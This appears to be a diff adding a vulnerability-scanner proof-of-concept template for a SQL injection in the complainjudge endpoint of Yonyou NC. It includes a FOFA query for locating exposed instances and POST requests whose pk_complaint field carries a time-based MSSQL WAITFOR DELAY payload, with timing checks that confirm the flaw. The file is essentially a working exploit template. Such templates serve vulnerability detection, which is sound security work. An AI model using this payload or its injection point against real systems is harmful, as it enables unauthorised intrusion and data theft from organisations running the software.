@@ -1,0 +1,33 @@
+id: poc-yaml-yongyou-complainjudge-sqli
+info:
+  name: 用友NC系统complainjudge接口SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_int(5,9)
+  t2: t1 + 3
+  t3: random_int(1,4)
+  t4: t3 + 3
+firstRequest:
+  method: GET
+  path: /ebvp/advorappcoll/complainjudge
+  expression: "status_code == 405 && \ncontains(headers,\"Method Not Allowed\")\n"
+requests:
+- method: POST
+  path: /ebvp/advorappcoll/complainjudge
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:{{.t1}}%27--
+  expression: "status_code == 500 && \nduration >= t1 &&\nduration <= t2 &&\ncontains(headers,\"\
+    Path=/ebvp/\")\n"
+- method: POST
+  path: /ebvp/advorappcoll/complainjudge
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: pageId=login&pk_complaint=11%27;WAITFOR%20DELAY%20%270:0:{{.t3}}%27--
+  expression: "status_code == 500 && \nduration >= t3 &&\nduration <= t4 &&\ncontains(headers,\"\
+    Path=/ebvp/\")\n"
+transport: http
